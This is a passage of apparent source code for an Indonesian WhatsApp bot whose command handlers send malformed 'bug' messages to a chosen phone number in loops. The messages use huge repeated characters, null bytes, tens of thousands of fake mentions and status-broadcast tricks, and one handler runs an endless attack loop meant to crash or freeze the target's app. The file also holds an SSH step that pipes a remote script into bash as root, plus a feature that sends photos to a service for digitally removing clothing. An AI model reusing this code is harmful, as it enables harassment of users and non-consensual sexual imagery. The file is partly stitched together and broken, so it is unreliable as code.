      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "xxx Team" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/NuxzOfficiall",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await Lanzexe.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

if (!isPremium && !isCreator) return ReplyLanz(mess.prem)
    if (!q) return ReplyLanz(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return ReplyLanz(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
 //   console.log("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠")
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 30; i++) {
    await ButtonVidio(target)

    }
    await sleep(1000);
    console.log("Succes send Bug");
}
break
case 'banci': {
  if (!isCreator) return ReplyLanz('❌ Fitur hanya untuk owner');
 // if (!q) return ReplyLanz(`*Example: ${prefix + command} 6281234567890|Halo, ini pesan uji!*`);

//  let [target, teks] = q.split('|');
//  if (!target) return ReplyLanz(`Format salah!\nExample: ${prefix + command} 6281234567890|Halo dunia!`);

  let bijipler = q.replace(/[^0-9]/g, "");
  ReplyLanz('📤 Sedang mengirim pesan...');
let target = bijipler + "@s.whatsapp.net";

  for (let i = 0; i < 30; i++) { // kirim 3 kali contoh
    await ProtocolBug(target, false);
    await ProtocolBug(target);
    await sleep(2000);
  }

  ReplyLanz(`✅ Pesan berhasil dikirim ke ${target}`);
}
break;

case 'ampas': {
if (!isPremium && !isCreator) return ReplyLanz(mess.prem)
    if (!q) return ReplyLanz(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return ReplyLanz(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await ReplyLanz("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠")
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
    await LocX(target)
    await xstick(Putzz, target)
    }
    await sleep(1000);
        Putzz.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5418/593854023_Putzzy.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : ${command} [ 𝐃𝐞𝐥𝐚𝐲 𝐇𝐚𝐫𝐝 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${bijipler}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Done ✅
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    await ReplyLanz("Succes send Bug");
}
break
            
            case 'bugandro': {
if (!isPremium && !isCreator) return ReplyLanz(mess.prem)
    if (!q) return ReplyLanz(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return ReplyLanz(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await ReplyLanz("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠")
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 60; i++) {
        //await Gaforcexui(Putzz, target)
        await carousel(target)
    }
    await sleep(1000);
    await ReplyLanz("Succes send Bug");
}
break

case 'putzz-invis': {
if (!isPremium && !isCreator) return ReplyLanz(mess.prem)
    if (!q) return ReplyLanz(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return ReplyLanz(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    
    await ReplyLanz("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠")
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 150; i++) {
      await DelaySsuper(target, true);
      await delayinvisiXo(target);
      await DelaySsuper(target, true);
      await delayinvisiXo(target);
    }
    await sleep(1000);
    await ReplyLanz("Succes send Bug");
}
break

async function InVisibleX1(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𑲭𑲭𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙕𐎟𑆻",
                    footerText: "𝘼𝙍𝙂𝘼 𝙊𝙁𝙁 ",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await Putzz.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await Putzz.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎𐎟𑆻⃔͒",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
            
case 'delaymaker': {
async function hhh(target, mention) {
 // Generate an array of delay mentions with increased size
 const delaymention = Array.from({ length: 10000 }, (_, r) => ({
 title: "᭯" + "\u0000" + "\u9999".repeat(500000), // Increased size
 rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
 }));

 // Create the message structure
 const MSG = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
 title: "𝐁 𝐞 𝐞 𝐥 𝐳 𝐞 𝐛 𝐮 𝐛 | ƚɔɘꞁoɿꟼ oɿiɒ⋊",
 listType: 2,
 buttonText: null,
 sections: delaymention,
 singleSelectReply: { selectedRowId: "🌀" },
 contextInfo: {
 mentionedJid: Array.from({ length: 10000 }, () => 
 `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
 ),
 participant: target,
 remoteJid: "status@broadcast",
 forwardingScore: 10000,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: "10000@newsletter",
 serverMessageId: 1,
 newsletterName: "-"
 }
 },
 description: null
 }
 }
 },
 contextInfo: {
 channelMessage: true,
 statusAttributionType: 2
 }
 };

 // Generate the message from content
 const msg = generateWAMessageFromContent(target, MSG, {});

 // Relay the message to the status broadcast
 await Putzz.relayMessage("status@broadcast", msg.message, {
 messageId: msg.key.id,
 statusJidList: [target],
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [
 {
 tag: "mentioned_users",
 attrs: {},
 content: [
 {
 tag: "to",
 attrs: { jid: target },
 content: undefined
 }
 ]
 }
 ]
 }
 ]
 });

 // If mention is true, send a status mention message
 if (mention) {
 await Putzz.relayMessage(
 target,
 {
 statusMentionMessage: {
 message: {
 protocolMessage: {
 key: msg.key,
 type: 25
 }
 }
 }
 },
 {
 additionalNodes: [
 {
 tag: "meta",
 attrs: { is_status_mention: "🌀 𝗥𝗶𝘇𝘅𝘃𝗲𝗹𝘇 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
 content: undefined
 }
 ]
 }
 );
 }
}

async function InVisibleX1(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𑲭𑲭𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙕𐎟𑆻",
                    footerText: "𝘼𝙍𝙂𝘼 𝙊𝙁𝙁 ",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await Putzz.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await Putzz.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎𐎟𑆻⃔͒",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function protocgolbug2(target, mention) {
 const generateMessage = {
 viewOnceMessage: {
 message: {
 imageMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
 mimetype: "image/jpeg",
 caption: "\u9999",
 fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
 fileLength: "19769",
 height: 354,
 width: 783,
 mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
 fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
 directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
 mediaKeyTimestamp: "1743225419",
 jpegThumbnail: null,
 scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
 scanLengths: [2437, 17332],
 contextInfo: {
 mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
 isSampled: true,
 participant: target,
 remoteJid: "status@broadcast",
 forwardingScore: 9741,
 isForwarded: true
 }
 }
 }
 }
 };

 const msg = generateWAMessageFromContent(target, generateMessage, {});

 await Putzz.relayMessage("status@broadcast", msg.message, {
 messageId: msg.key.id,
 statusJidList: [target],
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [
 {
 tag: "mentioned_users",
 attrs: {},
 content: [
 {
 tag: "to",
 attrs: { jid: target },
 content: undefined
 }
 ]
 }
 ]
 }
 ]
 });

 if (mention) {
 await Putzz.relayMessage(
 target,
 {
 statusMentionMessage: {
 message: {
 protocolMessage: {
 key: msg.key,
 type: 25
 }
 }
 }
 },
 {
 additionalNodes: [
 {
 tag: "meta",
 attrs: { is_status_mention: "\u9999" },
 content: undefined
 }
 ]
 }
 );
 }
}

async function protocolbugf(target, shibal) {
 const Rizxvelz = generateWAMessageFromContent(target, {
 viewOnceMessage: {
 message: {
 videoMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
 mimetype: "video/mp4",
 fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
 fileLength: "999999",
 seconds: 999999,
 mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
 caption: "(🐉) 𝐁 𝐞 𝐞 𝐥 𝐳 𝐞 𝐛 𝐮 𝐛 | ƚɔɘꞁoɿꟼ oɿiɒ⋊",
 height: 999999,
 width: 999999,
 fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
 directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
 mediaKeyTimestamp: "1743742853",
 contextInfo: {
 isSampled: true,
 mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
 length: 30000
 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
 },
 streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
 thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
 thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
 thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
 annotations: [{
 embeddedContent: {
 embeddedMusic: {
 musicContentMediaId: "kontol",
 songId: "peler",
 author: "Rizxvelz Official",
 title: "Zoro",
 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
 artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
 countryBlocklist: true,
 isExplicit: true,
 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
 }
 },
 embeddedAction: null
 }]
 }
 }
 }
 }, {});
 await Putzz.relayMessage("status@broadcast", Rizxvelz.message, {
 messageId: Rizxvelz.key.id,
 statusJidList: [target],
 additionalNodes: [{
 tag: "meta",
 attrs: {},
 content: [{
 tag: "mentioned_users",
 attrs: {},
 content: [{
 tag: "to",
 attrs: {
 jid: target
 },
 content: undefined
 }]
 }]
 }]
 });
 if (shibal) {
 const payment0 = {
 key: Rizxvelz.key,
 type: 25
 };
 const payment1 = {
 protocolMessage: payment0
 };
 const payment2 = {
 message: payment1
 };
 const payment = {
 groupStatusMentionMessage: payment2
 };
 const paymen10 = {
 tag: "meta",
 attrs: {},
 content: undefined
 };
 paymen10.attrs.is_status_mention = "true";
 const kuntul = {
 additionalNodes: [paymen10]
 };
 await Putzz.relayMessage(target, payment, kuntul);
 }
}

function delay(ms) {
 return new Promise(resolve => setTimeout(resolve, ms));
}

async function buttonStatus(target, mention) {
let pesan = await generateWAMessageFromContent(target, {
buttonsMessage: {
text: "𝐁 𝐞 𝐞 𝐥 𝐳 𝐞 𝐛 𝐮 𝐛 | ƚɔɘꞁoɿꟼ oɿiɒ⋊",
contentText: "~ Ohayooo̴",
footerText: "👼 Putzz - Project",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "⚡" + "\u0000".repeat(400000) }, type: 1 }
],
headerType: 1
}
}, {});

await Putzz.relayMessage("status@broadcast", pesan.message, {
messageId: pesan.key.id,
statusJidList: [target],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }
]
});

if (mention) {
await Putzz.relayMessage(target, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: pesan.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "P𝗿𝗼𝘁𝗼𝗰𝗼𝗹" }, content: undefined }
]
});
}
}

async function SuperDelayMention(target) {
 let count = 0;

 while (true) {
 try {
// InVisibleX1(target, show);
 await protocolbug3(target, false);
 await buttonStatus(target, false);
 await delay(250)
 await protocolbug2(target, false);
 await protocolbug(target, false);
// await InVisibleX1(target, show);
 count++;
 console.log(chalk.green(`[ INFO ] Attack Ke ${count} Berhasil Ke Target: ${target}`));

 if (count % 60 === 0) {
 console.log(chalk.yellow(`[ INFO ] Delay 15 detik setelah ${count} pengiriman...`));
 await delay(15000);
 }

 } catch {
 // Silent retry, no log
 await delay(15000);
 }
 }
}
 if (!isOwner) return ReplyLanz(`\`ONLY MY OWNER\``);

 if (!text) {
 return ReplyLanz(example(" 62xxx"));
 }
 target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 ReplyLanz(`\`MENGIRIM TARGET\`\n> ${target}`);
 for (let i = 0; i < 1; i++) {
 await SuperDelayMention(target);
 }
}
break

 // If mention is true
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "2010": {
m.reply (` *INI LINK QRIS ALL PAYMENT*
https://play.google.com/store/apps/details?id=com.uperpaykita
[ \`yang PutzzOfficial pake\` ]

https://play.google.com/store/search?q=algastaku&c=apps
 `)
Putzz.sendMessage
}
break
case 'tesaja':{
await Putzz.sendMessage(m.chat, {
                    sticker: {
                        url: './media/mengeluarkan.webp'
                    }
                }, {
                    quoted: qfc
                })
}
break
case "send_hadiah":
case "hadiah ku mana?": {
ReplyLanz(`ini hadiah mu kak *${m.pushName}*

https://www.mediafire.com/file/10i3mvbkwgy23md/ini_wak.txt/file

disitu ada 1 case
gw tidur capek add case`)
Putzz.sendMessage
}
break

case 'xfloid': {
if (!isPremium && !isCreator) return ReplyLanz(mess.prem)
    if (!q) return ReplyLanz(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return ReplyLanz(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 40; i++) {
        await Overload(target) 
        await InvisiPayload(target) 
        await Overload(target) 
        await InvisiPayload(target) 
        //await Private02(target, false)
    }
    await sleep(1000);
    await ReplyLanz("Succes send Bug");
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
if (!isCreator && !isAdmins) return ReplyLanz(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Putzz.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Putzz.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return ReplyLanz(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstalltema": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text || !text.split("|")) return ReplyLanz(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return ReplyLanz(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await ReplyLanz("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyLanz("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyLanz('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case 'figure':
case 'figure2': {
  try {
    const axios = require("axios");
    const FormData = require("form-data");

    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || "";

    if (!/image/.test(mime))
      return ReplyLanz(`✨ Balas *gambar* dengan caption *.${command}*`);

    await Putzz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

    // Unduh gambar
    const buffer = await q.download();
    if (!buffer) throw new Error("❌ Gagal mengunduh gambar");

    // Upload ke Catbox
    const uploadToCatbox = async (buffer) => {
      const form = new FormData();
      form.append("reqtype", "fileupload");
      form.append("fileToUpload", buffer, {
        filename: "photo.jpg",
        contentType: "image/jpeg",
      });
      const res = await axios.post("https://catbox.moe/user/api.php", form, {
        headers: form.getHeaders(),
      });
      if (typeof res.data === "string" && res.data.startsWith("http"))
        return res.data.trim();
      throw new Error("Gagal upload ke Catbox: " + res.data);
    };

    const imageUrl = await uploadToCatbox(buffer);
    if (!/^https?:\/\//.test(imageUrl))
      throw new Error("URL hasil upload tidak valid");

    console.log("Image URL:", imageUrl);

    // Panggil API FAA ToFigure tanpa tangan
    const apiUrl = `https://api-faa.my.id/faa/tofigurav2?url=${encodeURIComponent(
      imageUrl
    )}&prompt=${encodeURIComponent("make a 3D anime figure without visible hands or arms")}`;

    const resApi = await axios.get(apiUrl, {
      responseType: "arraybuffer",
      timeout: 180000,
    });

    const resultBuffer = Buffer.from(resApi.data);
    if (!resultBuffer || resultBuffer.length < 1000)
      throw new Error("❌ API tidak mengembalikan gambar yang valid");

    // Kirim hasil
    await Putzz.sendMessage(
      m.chat,
      { image: resultBuffer, caption: `✨ Hasil AI ToFigure` },
      { quoted: m }
    );

    await Putzz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

  } catch (e) {
    console.error(e);
    ReplyLanz(`❌ Terjadi kesalahan: ${e.message}`);
  }
}
break;
case 'putihkan':
case 'hitamkan': {

if (!isPremium) return ReplyLanz(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return ReplyLanz(`mana foto nya?`);
    }
 
    ReplyLanz('Loading...');

    try {
        
        let media = await Putzz.downloadAndSaveMediaMessage(m.quoted);
        let directLink = await CatBox(media);
        const apiUrl = `https://api-faa.my.id/faa/editfoto?url=${encodeURIComponent(directLink)}&prompt=${command} warna kulit nya`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await Putzz.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: qfake });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        ReplyLanz(`❌ Terjadi kesalahan saat memproses gambar.`);
    }
}
break;
case 'bugilkan': 
case 'removeclothes': {
if (!isUserPremium && !isCreator) return
  try {
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || q.mediaType || '';
    if (!/image\/(jpe?g|png)/.test(mime)) {
      return ReplyLanz('⚠️ Reply gambar dengan command : .removeclothes');
    }

    const imgBuffer = await q.download();
    if (!imgBuffer) return ReplyLanz('❌ Error saat mengunduh gambar');

    ReplyLanz('🪄 Memproses gambar, tunggu sebentar...');

    // Upload ke CDN untuk mendapatkan URL
    const form = new FormData();
    form.append("cdnFile", imgBuffer, "image.jpg");

    const upload = await axios.post("https://aliceecdn.vercel.app/upload", form, {
      headers: { ...form.getHeaders() },
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });

    if (!upload.data?.url) return ReplyLanz("❌ Gagal upload gambar ke CDN");

    const fileUrl = upload.data.url;

    // Panggil API remove clothes VelynAPIs dengan API key dari global
    const removeRes = await axios.get(
      `https://www.velyn.mom/api/tools/remove?url=${encodeURIComponent(fileUrl)}&apikey=velynapis`
    );

    // Response berupa JSON dengan URL hasil, bukan gambar langsung
    if (!removeRes.data?.status || !removeRes.data?.result?.url) {
      return ReplyLanz('❌ API gagal memproses gambar');
    }

    const resultUrl = removeRes.data.result.url;

    // Download gambar hasil dari URL yang diberikan
    const imageResponse = await axios.get(resultUrl, {
      responseType: 'arraybuffer'
    });

    // Kirim hasil ke chat
    await Putzz.sendMessage(m.chat, {
      image: Buffer.from(imageResponse.data),
      caption: '✅ Pakaian berhasil dihapus!'
    }, { quoted: m });

  } catch (e) {
    console.error("REMOVE-CLOTHES ERROR:", e.response?.data || e.message);
    ReplyLanz(`🚨 Error: ${e.message}`);
  }
}
break
case 'deployzip': {
  const fs = require('fs')
  const path = require('path')
  const { execSync } = require('child_process')
  const axios = require('axios')

  if (!m.quoted) return ReplyLanz('Reply file zip nya')
  if (!text) return ReplyLanz('harap masukan nama repo') 
  const token = global.githubToken
  const owner = 'LanzNotDev'
  const repo = text

  if (!token) return ReplyLanz('Token github belum di set')

  try {
    ReplyLanz('Processing...')

    const tmpDir = './tmp'
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir)

    const zipPath = `${tmpDir}/${Date.now()}.zip`
    const buffer = await m.quoted.download()
    fs.writeFileSync(zipPath, buffer)

    const extractPath = `${tmpDir}/extract_${Date.now()}`
    fs.mkdirSync(extractPath)

    execSync(`unzip ${zipPath} -d ${extractPath}`)

    //  AUTO DETECT ROOT (BIAR GA MASUK FOLDER DALAM)
    let finalPath = extractPath
    const isi = fs.readdirSync(extractPath)

    if (isi.length === 1) {
      const first = path.join(extractPath, isi[0])
      if (fs.lstatSync(first).isDirectory()) {
        finalPath = first
      }
    }

    async function getFiles(url = `https://api.github.com/repos/${owner}/${repo}/contents`) {
      const res = await axios.get(url, {
        headers: { Authorization: `token ${token}` }
      })
      return res.data
    }

    async function deleteAll(files) {
      for (let file of files) {
        if (file.type === 'file') {
          await axios.delete(
            `https://api.github.com/repos/${owner}/${repo}/contents/${file.path}`,
            {
              headers: { Authorization: `token ${token}` },
              data: {
                message: `delete ${file.path}`,
                sha: file.sha
              }
            }
          )
        } else if (file.type === 'dir') {
          const sub = await getFiles(file.url)
          await deleteAll(sub)
        }
      }
    }

    async function uploadDir(dir, base = '') {
      const files = fs.readdirSync(dir)

      for (let file of files) {
        const fullPath = path.join(dir, file)
        const repoPath = path.join(base, file).replace(/\\/g, '/')

        if (fs.lstatSync(fullPath).isDirectory()) {
          await uploadDir(fullPath, repoPath)
        } else {
          const content = fs.readFileSync(fullPath, 'base64')

          await axios.put(
            `https://api.github.com/repos/${owner}/${repo}/contents/${repoPath}`,
            {
              message: `upload ${repoPath}`,
              content
            },
            {
              headers: { Authorization: `token ${token}` },
              maxBodyLength: Infinity,
              maxContentLength: Infinity
            }
          )
        }
      }
    }

    const files = await getFiles()
    if (files.length) await deleteAll(files)

    await uploadDir(finalPath)

    ReplyLanz('Sukses deploy zip ke github')
  } catch (err) {
    console.log(err)
    ReplyLanz('Error: ' + err.message)
  }
}
break
case 'edit': {

if (!isPremium) return ReplyLanz(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return ReplyLanz(`⚠️ _Reply sebuah gambar dengan caption *${command}aiedit <prompt>*_\n\nContoh: ${command}l ubah jadi anime`);
    }
 
    if (!text) {
        return ReplyLanz(`⚠️ Masukkan perintah edit (prompt)!\n\nContoh: ${command} ubah jadi sketsa pensil`);
    }
 
    ReplyLanz('Loading...');

    try {
        
        let media = await Putzz.downloadAndSaveMediaMessage(q);
        let directLink = await CatBox(media);
        
        const apiUrl = `https://api-faa.my.id/faa/editfoto?url=${encodeURIComponent(directLink)}&prompt=${encodeURIComponent(text)}`;
        
